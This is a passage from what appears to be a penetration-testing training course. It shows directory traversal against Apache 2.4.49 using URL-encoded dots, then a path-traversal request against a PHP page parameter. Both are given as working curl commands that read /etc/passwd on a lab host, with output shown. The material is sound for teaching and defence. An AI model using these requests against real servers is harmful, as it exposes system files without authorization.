## List 138 - "../.." to leverage the Directory Traversal vulnerability in Apache 2.4.49

List 138 demonstrates that after attempting queries with a different number of `../` we could not display the contents of `/etc/passwd` via directory traversal. By leveraging `../` is known to bypass web application behavior, this sequence is often filtered by either the web server, server application filters, or the web application itself.

Fortunately, we can use URL Encoding, which also called Percent Encoding, to potentially bypass these filters. We can leverage special ASCII encoding lists to manually encode our query from list 138 or use the online converter on the page. For now, we will only encode the dots, which are "%2e".

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
root:x:0:0:root:/root:/bin
daemon:x:1:1:daemon:/usr:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
_apt:x:100:65534::nonexistent:/usr/sbin/nologin
alfred:x:1000:1000:/home/alfred:/bin/bash
```

## List 139 - Using encoded dots for Directory Traversal

We have successfully used directory traversal with encoded dots to display the contents of `/etc/passwd` on the target machine.

Generally, URL encoding is used to convert characters of a request into a format that can be transmitted over the internet. However, it is also a popular method for malicious purposes. The reason for this is that the encoded representation of characters in a request may be missed by filters, which only check for the plain-text representation of e.g. `../` but not `%2e%2e/`. After the request passes the filter, the web application or service interprets the encoded characters as valid.

## 9.2 Local File Inclusion (LFI)

Before we examine Local File Inclusion (LFI), let's take a moment to explore the differences between File Inclusion and Directory Traversal. These two concepts get mixed up frequently. Directory traversal allows an attacker to access files outside the web root by using `../` sequences. File inclusion, on the other hand, allows an attacker to include and execute files located on the local or remote server.

In the following example, we will use directory traversal to access the `/etc/passwd` file, which is a common technique to prove the existence of the vulnerability.

```bash
kali@kali:/var/www/html$ curl http://192.168.50.16/index.php?page=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin
daemon:x:1:1:daemon:/usr:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
_apt:x:100:65534::nonexistent:/usr/sbin/nologin
alfred:x:1000:1000:/home/alfred:/bin/bash
```
